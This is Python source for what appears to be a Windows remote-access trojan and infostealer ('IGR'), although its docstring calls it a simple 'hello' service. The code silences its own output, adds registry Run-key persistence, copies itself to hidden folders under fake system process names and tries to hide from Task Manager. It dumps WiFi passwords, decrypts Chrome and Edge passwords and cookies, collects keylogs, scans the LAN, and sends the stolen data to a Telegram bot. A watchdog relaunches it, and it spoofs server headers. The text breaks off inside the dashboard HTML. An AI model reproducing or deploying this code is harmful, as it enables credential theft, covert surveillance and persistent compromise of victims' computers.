#!/usr/bin/env python3
"""
Auto-start service with Cloudflared tunnel and Discord webhook notification.
Starts a simple service displaying "hello" on a random port,
exposes it via Cloudflared, and posts the URL to Discord webhook.
"""

# ============================================================================
# CONFIGURATION - Values are injected from config.txt during build
# ============================================================================

DISCORD_WEBHOOK_URL = "BUILD_DISCORD_WEBHOOK"
DISCORD_USERNAME = "BUILD_DISCORD_USERNAME"
SERVICE_MESSAGE = "hello"
SERVICE_HOST = "0.0.0.0"
DASHBOARD_PASSWORD = "BUILD_DASHBOARD_PASSWORD"
TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
UPDATE_URL = "BUILD_UPDATE_URL"

# ============================================================================
# END OF CONFIGURATION - DO NOT EDIT BELOW THIS LINE
# ============================================================================

import os
import random
import socket
import subprocess
import sys

# Runtime config loader - reads config.txt if BUILD_ placeholders detected
def _load_runtime_config():
    """Read config.txt at runtime if BUILD_ placeholders are still present (for testing without build)."""
    global DISCORD_WEBHOOK_URL, DISCORD_USERNAME, DASHBOARD_PASSWORD
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, UPDATE_URL
    if not any(v.startswith("BUILD_") for v in [DISCORD_WEBHOOK_URL, DASHBOARD_PASSWORD, TELEGRAM_BOT_TOKEN]):
        return
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.txt")
    if not os.path.exists(config_path):
        return
    mapping = {
        "DISCORD_WEBHOOK": "DISCORD_WEBHOOK_URL",
        "DISCORD_USERNAME": "DISCORD_USERNAME",
        "DASHBOARD_PASSWORD": "DASHBOARD_PASSWORD",
        "TELEGRAM_BOT_TOKEN": "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_CHAT_ID": "TELEGRAM_CHAT_ID",
        "UPDATE_URL": "UPDATE_URL",
    }
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '=' in line:
                    key, val = line.split('=', 1)
                    key = key.strip()
                    val = val.strip()
                    if key in mapping:
                        globals()[mapping[key]] = val
    except:
        pass

_load_runtime_config()
import time
import base64
import threading
import io
from typing import Optional
import platform
from datetime import datetime
from contextlib import redirect_stderr, redirect_stdout

# Suppress ALL output including C/C++ libraries (OpenCV, etc.)
# Must be done before any imports that might use stderr
os.close(2)  # Close stderr (fd 2)
os.close(1)  # Close stdout (fd 1)
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Suppress OpenCV internal logging
os.environ['OPENCV_LOG_LEVEL'] = 'SILENT'
os.environ['OPENCV_VIDEOIO_DEBUG'] = '0'

import requests
from flask import Flask, Response, render_template_string, jsonify, request, send_file

# Set paths based on configuration - works for both .py and PyInstaller .exe
if getattr(sys, 'frozen', False):
    script_dir = os.path.dirname(sys.executable)
    _INTERNAL_DIR = sys._MEIPASS
else:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    _INTERNAL_DIR = script_dir

bundled_cloudflared = os.path.join(script_dir, "cloudflared.exe")

if os.path.exists(bundled_cloudflared):
    CLOUDFLARED_PATH = bundled_cloudflared
else:
    CLOUDFLARED_PATH = os.path.join(script_dir, "cloudflared.exe")
    if not os.path.exists(CLOUDFLARED_PATH):
        try:
            cf_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            resp = requests.get(cf_url, timeout=30, allow_redirects=True)
            if resp.status_code == 200 and len(resp.content) > 1000000:
                with open(CLOUDFLARED_PATH, 'wb') as f:
                    f.write(resp.content)
        except:
            CLOUDFLARED_PATH = "cloudflared"

# Persistent keylog directory - remembers path across restarts
import string
KEYLOG_MARKER = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), ".igr_path")
if os.path.exists(KEYLOG_MARKER):
    try:
        with open(KEYLOG_MARKER, 'r') as f:
            KEYLOG_DIR = f.read().strip()
    except:
        KEYLOG_DIR = ""
    if not KEYLOG_DIR or not os.path.isdir(KEYLOG_DIR):
        random_dir_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        KEYLOG_DIR = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), f".{random_dir_name}")
else:
    random_dir_name = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    KEYLOG_DIR = os.path.join(os.environ.get('APPDATA', os.environ.get('TEMP', '.')), f".{random_dir_name}")

os.makedirs(KEYLOG_DIR, exist_ok=True)
with open(KEYLOG_MARKER, 'w') as f:
    f.write(KEYLOG_DIR)
KEYLOG_FILE = os.path.join(KEYLOG_DIR, "logs.txt")

# ============================================================================
# STEALTH - Registry persistence, internal spreading, process masking
# ============================================================================

_FAKE_NAMES = [
    "WindowsRuntime", "SystemService", "RuntimeBroker", "WpnService",
    "ctfmon", "dllhost", "taskhostw", "WinStoreApp", "SearchIndexer",
    "SecurityHealthSy", "RuntimeBrokerEx", "WinInitEx", "lsassEx"
]

def _add_registry_persistence() -> bool:
    """Add HKCU Run key persistence (no admin needed)."""
    try:
        import winreg
        exe_path = os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", "WindowsRuntime", "winruntime.exe")
        if not os.path.exists(exe_path):
            return False
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsRuntime", 0, winreg.REG_SZ,
            f'wscript.exe //b "{os.path.join(os.path.dirname(exe_path), "winruntime.vbs")}"')
        winreg.CloseKey(key)
        return True
    except:
        return False

def _spread_internally() -> int:
    """Copy exe to multiple hidden locations with different names. Returns count of copies made."""
    if not getattr(sys, 'frozen', False):
        return 0
    src = sys.executable
    _NO_WINDOW = 0x08000000
    locations = [
        os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", _FAKE_NAMES[0]),
        os.path.join(os.environ.get('LOCALAPPDATA', '.'), "Microsoft", _FAKE_NAMES[1]),
        os.path.join(os.environ.get('APPDATA', '.'), "Microsoft", "Windows", _FAKE_NAMES[2]),
        os.path.join(os.environ.get('PROGRAMDATA', '.'), _FAKE_NAMES[3]),
    ]
    count = 0
    for i, loc in enumerate(locations):
        try:
            os.makedirs(loc, exist_ok=True)
            fake_name = _FAKE_NAMES[i % len(_FAKE_NAMES)] + ".exe"
            dst = os.path.join(loc, fake_name)
            if not os.path.exists(dst):
                import shutil
                shutil.copy2(src, dst)
                try:
                    subprocess.run(f'attrib +h +s "{dst}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
                    subprocess.run(f'attrib +h +s "{loc}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
                except:
                    pass
                count += 1
                vbs_path = os.path.join(loc, _FAKE_NAMES[i % len(_FAKE_NAMES)] + ".vbs")
                with open(vbs_path, 'w') as vf:
                    vf.write(f'Set objShell = CreateObject("WScript.Shell")\nobjShell.Run """{dst}""", 0, False\n')
                try:
                    subprocess.run(f'attrib +h +s "{vbs_path}"', shell=True, creationflags=_NO_WINDOW, capture_output=True)
                except:
                    pass
        except:
            pass
    return count

def _hide_from_taskmanager() -> bool:
    """Attempt to hide process from Task Manager using NtSetInformationProcess."""
    try:
        import ctypes
        ntdll = ctypes.windll.ntdll
        ProcessInformation = 0x1D
        cls = ctypes.c_ulong * 1
        ntdll.NtSetInformationProcess(-1, ProcessInformation, cls(1), ctypes.sizeof(cls))
        return True
    except:
        return False

# ============================================================================
# TELEGRAM INTEGRATION - Multi-PC tracking with editable status messages
# ============================================================================

_PC_ID = f"{socket.gethostname()}_{os.environ.get('USERNAME', 'unknown')}"
_TELEGRAM_STATE_FILE = os.path.join(KEYLOG_DIR, ".tg_state.json")

def _send_telegram(text: str, parse_mode: str = "HTML") -> bool:
    """Send message to Telegram bot."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}
        resp = requests.post(url, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def _send_telegram_get_id(text: str, parse_mode: str = "HTML") -> Optional[str]:
    """Send message and return message_id for future edits."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
        return None
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}
        resp = requests.post(url, json=payload, timeout=15)
        if resp.status_code == 200:
            return str(resp.json().get("result", {}).get("message_id", ""))
        return None
    except:
        return None

def _edit_telegram(message_id: str, text: str, parse_mode: str = "HTML") -> bool:
    """Edit an existing Telegram message by message_id."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text, "parse_mode": parse_mode}
        resp = requests.post(url, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def _send_telegram_file(file_path: str, caption: str = "") -> bool:
    """Send file to Telegram bot."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
            resp = requests.post(url, data=payload, files={"document": f}, timeout=30)
        return resp.status_code == 200
    except:
        return False

def _load_telegram_state() -> dict:
    """Load Telegram message state from local file."""
    try:
        if os.path.exists(_TELEGRAM_STATE_FILE):
            with open(_TELEGRAM_STATE_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {}

def _save_telegram_state(state: dict):
    """Save Telegram message state to local file."""
    try:
        with open(_TELEGRAM_STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(state, f)
    except:
        pass

def _build_pc_status_text(cloudflared_url: str, status: str = "🟢 Active") -> str:
    """Build the status message text for this PC. Truncated to fit Telegram 4096 char limit."""
    hostname = socket.gethostname()
    username = os.environ.get('USERNAME', 'Unknown')
    host_ip = "Unknown"
    try:
        local_ips = socket.gethostbyname_ex(hostname)[2]
        for ip in local_ips:
            if not ip.startswith('127.') and not ip.startswith('169.254.'):
                host_ip = ip
                break
    except:
        pass

    import platform as _pf
    os_info = f"{_pf.system()} {_pf.release()}"
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    header = f"""<b>{status} | {hostname}</b>
<b>User:</b> {username} | <b>IP:</b> {host_ip}
<b>OS:</b> {os_info}
<b>Dashboard:</b> {cloudflared_url or 'N/A'}
<b>Last Seen:</b> {now_str}"""

    wifi_pwds = _dump_wifi_passwords()
    wifi_text = ", ".join(wifi_pwds[:5]) if wifi_pwds else "None"

    recent = _get_recent_documents()
    recent_text = ", ".join(recent[:5]) if recent else "None"

    installed = _get_installed_software()
    installed_text = ", ".join(installed[:5]) if installed else "None"

    body = f"""

<b>WiFi:</b> {wifi_text}
<b>Recent:</b> {recent_text}
<b>Software:</b> {installed_text}"""

    result = header + body
    if len(result) > 4000:
        result = header + f"\n\n<b>WiFi:</b> {wifi_text[:200]}"
    if len(result) > 4000:
        result = header
    return result

def _delete_telegram_message(message_id: str) -> bool:
    """Delete a Telegram message by message_id."""
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN.startswith("BUILD_") or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id}
        resp = requests.post(url, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def _send_telegram_full_report(cloudflared_url: str) -> bool:
    """Send or update PC status message on Telegram. One message per PC, edited on reconnect."""
    try:
        state = _load_telegram_state()
        msg_text = _build_pc_status_text(cloudflared_url, "🟢 Active")
        pc_data = state.get(_PC_ID, {})
        pc_msg_id = pc_data.get("message_id", "")

        if pc_msg_id:
            edited = _edit_telegram(pc_msg_id, msg_text)
            if edited:
                state[_PC_ID]["last_seen"] = datetime.now().isoformat()
                state[_PC_ID]["status"] = "active"
                _save_telegram_state(state)
                _send_keylog_to_telegram()
                return True
            _delete_telegram_message(pc_msg_id)

        msg_id = _send_telegram_get_id(msg_text)
        if msg_id:
            state[_PC_ID] = {
                "message_id": msg_id,
                "status": "active",
                "last_seen": datetime.now().isoformat()
            }
            _save_telegram_state(state)
            _send_keylog_to_telegram()
            return True

        return _send_telegram(msg_text)
    except:
        return False

def _send_keylog_to_telegram():
    """Send the last session's keylog file to Telegram."""
    try:
        if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > 0:
            hostname = socket.gethostname()
            _send_telegram_file(KEYLOG_FILE, caption=f"📋 Keylogs from {hostname}")
    except:
        pass

def _telegram_mark_offline():
    """Edit the PC's Telegram status message to show offline."""
    try:
        state = _load_telegram_state()
        pc_data = state.get(_PC_ID, {})
        msg_id = pc_data.get("message_id", "")
        if not msg_id:
            return
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        offline_text = f"""<b>🔴 Offline | {socket.gethostname()}</b>

<b>User:</b> {os.environ.get('USERNAME', 'Unknown')}
<b>Last Seen:</b> {now_str}"""
        _edit_telegram(msg_id, offline_text)
        state[_PC_ID]["status"] = "offline"
        state[_PC_ID]["last_seen"] = datetime.now().isoformat()
        _save_telegram_state(state)
    except:
        pass

import atexit
atexit.register(_telegram_mark_offline)

_TELEGRAM_HEARTBEAT_RUNNING = True

def _telegram_heartbeat(cloudflared_url: str):
    """Periodically update the Telegram status message with current Last Seen time."""
    global _TELEGRAM_HEARTBEAT_RUNNING
    while _TELEGRAM_HEARTBEAT_RUNNING:
        time.sleep(60)
        try:
            state = _load_telegram_state()
            pc_data = state.get(_PC_ID, {})
            msg_id = pc_data.get("message_id", "")
            if not msg_id:
                continue
            msg_text = _build_pc_status_text(cloudflared_url, "🟢 Active")
            if _edit_telegram(msg_id, msg_text):
                state[_PC_ID]["last_seen"] = datetime.now().isoformat()
                _save_telegram_state(state)
        except:
            pass

# ============================================================================
# DATA HARVESTING FUNCTIONS
# ============================================================================

def _dump_wifi_passwords() -> list:
    """Extract all saved WiFi passwords."""
    results = []
    try:
        profiles = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True, text=True, timeout=15, creationflags=0x08000000
        )
        for line in profiles.stdout.split('\n'):
            if 'All User Profile' in line or 'Profile' in line:
                name = line.split(':', 1)[-1].strip()
                if not name:
                    continue
                try:
                    key_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', name, 'key=clear'],
                        capture_output=True, text=True, timeout=10, creationflags=0x08000000
                    )
                    password = ""
                    for kline in key_result.stdout.split('\n'):
                        if 'Key Content' in kline or 'Security Key' in kline:
                            password = kline.split(':', 1)[-1].strip()
                            break
                    results.append(f"{name}: {password}" if password else f"{name}: (no password)")
                except:
                    results.append(f"{name}: (access denied)")
    except:
        pass
    return results

def _decrypt_chrome_passwords() -> list:
    """Decrypt Chrome saved passwords."""
    results = []
    try:
        import json
        import sqlite3
        import shutil as _sh

        chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
            'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if not os.path.exists(chrome_path):
            return results

        tmp_db = os.path.join(KEYLOG_DIR, "_tmp_chrome.db")
        _sh.copy2(chrome_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for url, user, encrypted_pw in cursor.fetchall():
            try:
                import ctypes as _ct
                data = encrypted_pw
                if data[:3] == b'v10' or data[:3] == b'v20':
                    crypt32 = _ct.windll.crypt32
                    dpapi = _ct.windll.dpapi

                    local_state_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                        'Google', 'Chrome', 'User Data', 'Local State')
                    with open(local_state_path, 'r', encoding='utf-8') as ls:
                        local_state = json.loads(ls.read())
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]

                    class DATA_BLOB(_ct.Structure):
                        _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]

                    blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
                    blob_out = DATA_BLOB()
                    dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
                    key = _ct.string_at(blob_out.pbData, blob_out.cbData)

                    nonce = data[3:15]
                    ciphertext = data[15:-16]
                    tag = data[-16:]

                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                    aes = AESGCM(key)
                    decrypted = aes.decrypt(nonce, data[3:], None)
                    pw = decrypted.decode('utf-8', errors='replace')
                else:
                    class DATA_BLOB(_ct.Structure):
                        _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
                    blob_in = DATA_BLOB(len(data), data)
                    blob_out = DATA_BLOB()
                    _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
                    pw = _ct.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='replace')

                results.append(f"{url} | {user} | {pw}")
            except:
                results.append(f"{url} | {user} | (decrypt failed)")

        conn.close()
        try:
            os.remove(tmp_db)
        except:
            pass
    except:
        pass
    return results

def _decrypt_edge_passwords() -> list:
    """Decrypt Edge saved passwords."""
    results = []
    try:
        import json
        import sqlite3
        import shutil as _sh

        edge_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
            'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        if not os.path.exists(edge_path):
            return results

        tmp_db = os.path.join(KEYLOG_DIR, "_tmp_edge.db")
        _sh.copy2(edge_path, tmp_db)

        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        for url, user, encrypted_pw in cursor.fetchall():
            try:
                import ctypes as _ct
                data = encrypted_pw
                if data[:3] == b'v10' or data[:3] == b'v20':
                    local_state_path = os.path.join(os.environ.get('LOCALAPPDATA', ''),
                        'Microsoft', 'Edge', 'User Data', 'Local State')
                    with open(local_state_path, 'r', encoding='utf-8') as ls:
                        local_state = json.loads(ls.read())
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    encrypted_key = encrypted_key[5:]

                    class DATA_BLOB(_ct.Structure):
                        _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]

                    blob_in = DATA_BLOB(len(encrypted_key), encrypted_key)
                    blob_out = DATA_BLOB()
                    _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
                    key = _ct.string_at(blob_out.pbData, blob_out.cbData)

                    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                    aes = AESGCM(key)
                    nonce = data[3:15]
                    decrypted = aes.decrypt(nonce, data[3:], None)
                    pw = decrypted.decode('utf-8', errors='replace')
                else:
                    class DATA_BLOB(_ct.Structure):
                        _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
                    blob_in = DATA_BLOB(len(data), data)
                    blob_out = DATA_BLOB()
                    _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
                    pw = _ct.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='replace')

                results.append(f"{url} | {user} | {pw}")
            except:
                results.append(f"{url} | {user} | (decrypt failed)")

        conn.close()
        try:
            os.remove(tmp_db)
        except:
            pass
    except:
        pass
    return results

def _steal_browser_cookies() -> list:
    """Extract Chrome and Edge cookies (URL + name + value)."""
    results = []
    for browser_name, browser_path in [
        ("Chrome", os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')),
        ("Edge", os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'))
    ]:
        try:
            import sqlite3
            import shutil as _sh
            if not os.path.exists(browser_path):
                continue
            tmp_db = os.path.join(KEYLOG_DIR, f"_tmp_{browser_name.lower()}_cookies.db")
            _sh.copy2(browser_path, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
            for host, name, enc_val in cursor.fetchall():
                try:
                    import ctypes as _ct
                    data = enc_val
                    if data and (data[:3] == b'v10' or data[:3] == b'v20'):
                        results.append(f"[{browser_name}] {host} | {name} | (encrypted)")
                    elif data:
                        class DATA_BLOB(_ct.Structure):
                            _fields_ = [('cbData', _ct.c_uint32), ('pbData', _ct.c_char_p)]
                        blob_in = DATA_BLOB(len(data), data)
                        blob_out = DATA_BLOB()
                        _ct.windll.dpapi.CryptUnprotectData(_ct.byref(blob_in), None, None, None, None, 0, _ct.byref(blob_out))
                        val = _ct.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='replace')
                        results.append(f"[{browser_name}] {host} | {name} | {val}")
                except:
                    results.append(f"[{browser_name}] {host} | {name} | (decrypt failed)")
            conn.close()
            try:
                os.remove(tmp_db)
            except:
                pass
        except:
            pass
    return results

def _get_installed_software() -> list:
    """Get list of installed software from registry."""
    results = []
    try:
        import winreg
        for hive_key, hive_name in [(winreg.HKEY_LOCAL_MACHINE, "HKLM"), (winreg.HKEY_CURRENT_USER, "HKCU")]:
            for wow64 in ["", r"\Wow6432Node"]:
                try:
                    key = winreg.OpenKey(hive_key,
                        rf"Software{wow64}\Microsoft\Windows\CurrentVersion\Uninstall")
                    i = 0
                    while True:
                        try:
                            subkey_name = winreg.EnumKey(key, i)
                            subkey = winreg.OpenKey(key, subkey_name)
                            try:
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                results.append(str(name))
                            except:
                                pass
                            winreg.CloseKey(subkey)
                            i += 1
                        except OSError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
    except:
        pass
    return sorted(set(results))

def _get_recent_documents() -> list:
    """Get recently accessed documents."""
    results = []
    try:
        recent_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
        if os.path.exists(recent_dir):
            items = os.listdir(recent_dir)
            items.sort(key=lambda x: os.path.getmtime(os.path.join(recent_dir, x)), reverse=True)
            for item in items[:20]:
                results.append(item)
    except:
        pass
    return results

def _get_system_inventory() -> dict:
    """Get comprehensive system inventory."""
    try:
        import platform as _pf
        import ctypes
        inventory = {
            'os': f"{_pf.system()} {_pf.release()}",
            'version': _pf.version(),
            'machine': _pf.machine(),
            'processor': _pf.processor() or 'Unknown',
            'hostname': _pf.node(),
            'username': os.environ.get('USERNAME', 'Unknown'),
            'domain': os.environ.get('USERDOMAIN', 'Unknown'),
            'arch': os.environ.get('PROCESSOR_ARCHITECTURE', 'Unknown'),
            'cores': os.environ.get('NUMBER_OF_PROCESSORS', 'Unknown'),
        }
        try:
            kernel32 = ctypes.windll.kernel32
            buf = ctypes.create_unicode_buffer(256)
            kernel32.GetComputerNameExW(2, buf, ctypes.byref(ctypes.c_ulong(256)))
            inventory['fqdn'] = buf.value
        except:
            pass
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            inventory['cpu_name'] = winreg.QueryValueEx(key, "ProcessorNameString")[0]
            winreg.CloseKey(key)
        except:
            pass
        try:
            import ctypes
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [('dwLength', ctypes.c_ulong), ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong), ('ullAvailPhys', ctypes.c_ulonglong)]
            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(mem)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            inventory['ram_total_gb'] = round(mem.ullTotalPhys / (1024**3), 1)
            inventory['ram_used_pct'] = mem.dwMemoryLoad
        except:
            pass
        try:
            import subprocess
            result = subprocess.run(['wmic', 'diskdrive', 'get', 'size'], capture_output=True, text=True, timeout=10, creationflags=0x08000000)
            lines = [l.strip() for l in result.stdout.strip().split('\n') if l.strip().isdigit()]
            if lines:
                inventory['disk_size_gb'] = round(int(lines[0]) / (1024**3), 1)
        except:
            pass
        return inventory
    except:
        return {}

def _scan_lan() -> list:
    """Scan local network for other devices."""
    results = []
    try:
        hostname = socket.gethostname()
        local_ips = socket.gethostbyname_ex(hostname)[2]
        for ip in local_ips:
            if ip.startswith('127.') or ip.startswith('169.254.'):
                continue
            parts = ip.split('.')
            subnet = '.'.join(parts[:3])
            for i in range(1, 255):
                target = f"{subnet}.{i}"
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    if s.connect_ex((target, 445)) == 0:
                        try:
                            name = socket.gethostbyaddr(target)[0]
                        except:
                            name = "Unknown"
                        results.append(f"{target} ({name})")
                    s.close()
                except:
                    pass
    except:
        pass
    return results

def _search_files(root_dir: str, pattern: str, max_results: int = 100) -> list:
    """Search for files matching pattern starting from root_dir."""
    results = []
    try:
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for fname in filenames:
                if pattern.lower() in fname.lower():
                    results.append(os.path.join(dirpath, fname))
                    if len(results) >= max_results:
                        return results
    except:
        pass
    return results

# ============================================================================
# OFFLINE QUEUE - Buffer data when no internet, send when back
# ============================================================================

_OFFLINE_QUEUE = []
_QUEUE_LOCK = threading.Lock()

def _queue_message(text: str):
    """Add message to offline queue."""
    with _QUEUE_LOCK:
        _OFFLINE_QUEUE.append({'text': text, 'time': datetime.now().isoformat()})

def _flush_queue():
    """Try to send all queued messages."""
    with _QUEUE_LOCK:
        while _OFFLINE_QUEUE:
            msg = _OFFLINE_QUEUE.pop(0)
            if not _send_telegram(msg['text']):
                _OFFLINE_QUEUE.insert(0, msg)
                break

def _queue_flush_loop():
    """Background thread that periodically flushes the offline queue."""
    while True:
        time.sleep(60)
        try:
            _flush_queue()
        except:
            pass

threading.Thread(target=_queue_flush_loop, daemon=True).start()

# ============================================================================
# WATCHDOG - Restart IGR if it dies
# ============================================================================

def _start_watchdog():
    """Launch a watchdog process that restarts IGR if it dies."""
    try:
        if not getattr(sys, 'frozen', False):
            return
        exe = sys.executable
        exe_dir = os.path.dirname(exe)
        exe_name = os.path.basename(exe)
        vbs_path = os.path.join(exe_dir, 'winruntime.vbs')
        watchdog_script = f"""
import subprocess, time, os
CREATE_NO_WINDOW = 0x08000000
while True:
    time.sleep(30)
    result = subprocess.run(['tasklist'], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
    if 'winruntime.exe' not in result.stdout and '{exe_name}' not in result.stdout:
        vbs = r"{vbs_path}"
        if os.path.exists(vbs):
            subprocess.Popen(['wscript.exe', '//b', vbs], creationflags=CREATE_NO_WINDOW, close_fds=True)
        else:
            subprocess.Popen([r'{exe}'], creationflags=CREATE_NO_WINDOW, close_fds=True)
        break
    if 'watchdog_igr' not in result.stdout:
        break
"""
        watchdog_path = os.path.join(KEYLOG_DIR, "_watchdog.py")
        with open(watchdog_path, 'w') as wf:
            wf.write(watchdog_script)
        subprocess.Popen(
            [sys.executable, watchdog_path],
            creationflags=0x08000000,
            close_fds=True
        )
        try:
            subprocess.run(f'attrib +h +s "{watchdog_path}"', shell=True, creationflags=0x08000000, capture_output=True)
        except:
            pass
    except:
        pass

app = Flask(__name__)

@app.after_request
def _remove_server_header(response):
    """Remove Flask/Werkzeug server header for stealth."""
    response.headers['Server'] = 'Microsoft-IIS/10.0'
    response.headers['X-Powered-By'] = 'ASP.NET'
    return response

DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IGR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #c084fc;
            overflow-x: hidden;
            font-size: 16px;
        }
        
        /* Login Screen */
        .login-screen {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: #0a0a0a;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        .login-box {
            background: #0f0a1a;
            border: 2px solid #a855f7;
            border-radius: 8px;
            padding: 50px;
            text-align: center;
            box-shadow: 0 0 40px rgba(168, 85, 247, 0.3);
        }
        .login-title {
            font-size: 42px;
            color: #a855f7;
            text-shadow: 0 0 20px #a855f7;
            margin-bottom: 40px;
        }
        .login-input {
            width: 300px;
            padding: 14px 18px;
            background: #0a0a0a;
            border: 2px solid #a855f7;
            border-radius: 4px;
            color: #c084fc;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            margin-bottom: 25px;
        }
        .login-btn {
            padding: 14px 50px;
            background: #a855f7;
            color: #000;
            border: none;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .login-btn:hover { box-shadow: 0 0 25px #a855f7; }
        .login-error { color: #ef4444; margin-top: 20px; font-size: 14px; display: none; }
        
